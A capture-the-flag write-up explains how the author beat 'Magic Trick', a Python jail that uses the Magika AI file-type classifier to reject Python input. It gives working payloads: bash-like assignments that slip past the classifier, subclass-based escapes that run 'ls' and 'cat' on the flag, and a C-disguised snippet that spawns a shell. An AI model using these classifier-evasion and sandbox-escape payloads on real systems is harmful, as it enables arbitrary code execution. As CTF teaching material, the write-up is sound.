# Magic Trick \[484 Points] (20 Solves)
```
I will take your code, and make it disappear!

Author: ahh
nc 193.148.168.30 6673 
```
[Attachment: zip archive](./misc-magic-trick)
## Writeup

**Magic Trick** is a simple **pyjail** wrapped in **Magika**, an AI for data type classification. \
For example it *should* be able to see python source code, and tell that it's python.

The challenge inputs a base64 file, makes sure, using **Magika**, that it's *not python*, and *executes* it as python. \

**And of course we can fool it \:)**

The *easiest* way to achieve it, is to take an open source library,
_**ideally in a language that is also valid python**_.

I chose **bash**, and took a most starred project on github which only uses **assignments and comments**. \
It's content mostly looks like this
```bash
#APP PATHS
appDir="$( cd $( dirname ${BASH_SOURCE[0]} ) && pwd )"
continuityCheckUtilPath="$appDir/continuityCheck.app/Contents/MacOS/continuityCheck"
backupFolderNameBeforePatch="KextsBackupBeforePatch" #kexts backup folder name, where the original untouched kexts should be placed
```
**Which is also valid python!**
```py
#APP PATHS
appDir="$( cd $( dirname ${BASH_SOURCE[0]} ) && pwd )"
continuityCheckUtilPath="$appDir/continuityCheck.app/Contents/MacOS/continuityCheck"
backupFolderNameBeforePatch="KextsBackupBeforePatch" #kexts backup folder name, where the original untouched kexts should be placed
```

Now when we fooled the AI, we just need to escape the `"__builtins__": None` pyjail. \
For this I booted the chal docker, entered pwn.red jail (to get the exact same
python version running on server) and printed the subclasses array
`(1).__class__.__base__.__subclasses__()`. \
Now all is left is to find the index of a function which would allow code execution. \
In this case index `443` would open a process based on the array.

One "problem" we have right now is that the flag path is randomized, so first we do an `ls`
```py
(1).__class__.__base__.__subclasses__()[443](['ls'])
```


And now when we get the name of the flag we can `cat` it
```py
(1).__class__.__base__.__subclasses__()[443](['cat', 'flag-Aub46K1Mv2oqIBBDMMwYmSfsRpz9jiXgYRiPYpdKZbDHlxfW258DoA33saRVjTN0.txt'])
```


[solve.txt](./solve.txt) is the raw file to be sent to the server, before base64 encoding.

**Flag:** `L3AK{dId_you_uS3_s0m3thiN9_OTHEr_7H4n_C? :O}`

## Intended Solution

```py
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <bool.h>
#define NULL 0
#define breakpoint extern main
a = [];
void = a.__class__
bool = void.__base__
char = bool.__subclasses__()
int = char[120];
os = "os";
c_posix_t = int.load_module(os);
c_posix_t.system("sh");
```
A similar pyjail escape, however instead of hiding the python in gibberish
the python itself looks like c.

This solution also explains flag's content \:)
